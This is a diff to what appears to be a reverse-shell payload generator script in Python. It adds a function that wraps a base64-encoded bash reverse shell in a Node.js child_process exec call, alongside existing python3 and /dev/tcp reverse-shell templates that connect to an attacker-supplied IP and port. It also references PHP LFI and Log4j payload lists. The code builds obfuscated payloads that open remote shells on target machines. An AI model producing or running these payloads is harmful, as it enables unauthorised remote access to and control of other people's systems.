@@ -58,6 +58,11 @@ def base64gen_py3(ip,port):
     temp = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' '''
     return base64.b64encode(temp.encode('ascii'))
 
+def base64gen_node(ip,port):
+    payload = base64gen(ip,port).decode("ascii")
+    temp = f'''require("child_process").exec("echo {payload} | base64 -d | bash")'''
+    return base64.b64encode(temp.encode('ascii'))
+
 def base64gen_urlencode(ip,port):
 	temp = 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1'.replace("{IP}",ip).replace("{PORT}",port)
 	return base64.b64encode(temp.encode('ascii'))
@@ -337,6 +342,9 @@ def main():
 			#print(payloads)
 			    temp = php_lfi_payload(payloads)
 			    print(j.replace("{IP}",ip).replace("{PORT}",port).strip().replace("{PHP_LFI}",temp))
+		elif "{NODE_BASE64}" in j:
+			temp = base64gen_node(ip,port)
+			print(j.replace("{NODE_BASE64}",temp.decode("ascii")).strip())
 		elif "{LOG4J}" in j:
 			log4j_list(ip)
 		else:
